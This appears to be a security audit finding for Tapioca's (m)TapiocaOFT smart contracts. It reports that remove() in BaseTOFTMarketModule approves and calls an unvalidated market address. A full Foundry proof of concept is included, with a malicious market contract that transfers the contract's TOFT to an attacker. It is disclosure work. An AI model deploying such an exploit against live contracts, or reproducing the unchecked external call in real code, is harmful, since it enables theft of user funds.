---
id: 25667
severity: "Crit/High"
---

# TOFT in (m)TapiocaOft contracts can be stolen by calling removeCollateral() with a malicious removeParams.market

## Description



## Proof of Concept

`(m)TapiocaOFT` inherit `BaseTOFT`, which has a function `removeCollateral()` that accepts a market address as an argument. This function calls `_lzSend()` internally on the source chain, which then is forwarded to the destination chain by the relayer and calls `lzReceive()`.

`lzReceive()` reaches `_nonBlockingLzReceive()` in `BaseTOFT` and delegate calls to the `BaseTOFTMarketModule` on function `remove()`. This function approves `TOFT` to the `removeParams.market` and then calls function `removeCollateral()` of the provided market. There is no validation whatsoever in this address, such that a malicious market can be provided that steals all funds, as can be seen below:

```solidity
function remove(bytes memory _payload) public {
    ...
    approve(removeParams.market, removeParams.share); // no validation prior to this 2 calls
    IMarket(removeParams.market).removeCollateral(
        to,
        to,
        removeParams.share
    );
    ...
}
```

The following POC in Foundry demonstrates this vulnerability, the attacker is able to steal all `TOFT` in `mTapiocaOFT`:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTMarketModule} from "contracts/tOFT/modules/BaseTOFTMarketModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";
import {ITapiocaOFT} from "tapioca-periph/contracts/interfaces/ITapiocaOFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousMarket {
    address public immutable attacker;
    address public immutable tapiocaOft;

    constructor(address attacker_, address tapiocaOft_) {
        attacker = attacker_;
        tapiocaOft = tapiocaOft_;
    }

    function removeCollateral(address, address, uint256 share) external {
        IERC20(tapiocaOft).transferFrom(msg.sender, attacker, share);
    }
}

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT = 0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 internal constant PT_MARKET_REMOVE_COLLATERAL = 772;

    function test_POC_StealAllAssetsInTapiocaOFT_RemoveCollateral_MaliciousMarket()
        public
    {
        vm.createSelectFork("https://eth.llamarpc.com");

        address marketModule_ = address(
            new BaseTOFTMarketModule(
                address(LZ_ENDPOINT),
                address(0),
                IYieldBoxBase(address(2)),
                "SomeName",
                "SomeSymbol",
                18,
                block.chainid
            )
        );

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            address(0),
            IYieldBoxBase(address(3)),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(address(2)),
            payable(marketModule_),
            payable(address(4))
        );

        // TOFT is acummulated in the TapiocaOft contract and can be stolen by the malicious market
        // for example, strategyDeposit of the BaseTOFTMarketModule credits TOFT to tapiocaOft
        uint256 tOftInTapiocaOft_ = 1 ether;
        deal(address(tapiocaOft_), address(tapiocaOft_), tOftInTapiocaOft_);

        address attacker_ = makeAddr("attacker");
        deal(attacker_, 1 ether); // lz fees

        uint16 lzDstChainId_ = 102;
        address zroPaymentAddress_ = address(0);
        ICommonData.IWithdrawParams memory withdrawParams_;
        ITapiocaOFT.IRemoveParams memory removeParams_;
        removeParams_.share = tOftInTapiocaOft_;
        removeParams_.market = address(new MaliciousMarket(attacker_, address(tapiocaOft_)));
        ICommonData.IApproval[] memory approvals_;
        bytes memory adapterParams_;

        tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_, abi.encodePacked(tapiocaOft_));

        vm.prank(attacker_);
        tapiocaOft_.removeCollateral{value: 1 ether}(
            attacker_,
            attacker_,
            lzDstChainId_,
            zroPaymentAddress_,
            withdrawParams_,
            removeParams_,
            approvals_,
            adapterParams_
        );

        bytes memory lzPayload_ = abi.encode(
            PT_MARKET_REMOVE_COLLATERAL,
            attacker_,
            attacker_,
            bytes32(bytes20(attacker_)),
            removeParams_,
            withdrawParams_,
            approvals_
        );

        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(lzDstChainId_, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
        assertEq(tapiocaOft_.balanceOf(attacker_), tOftInTapiocaOft_);
    }
}
```

## Recommendation

Whitelist the `removeParams.market` address to prevent users from providing malicious markets.
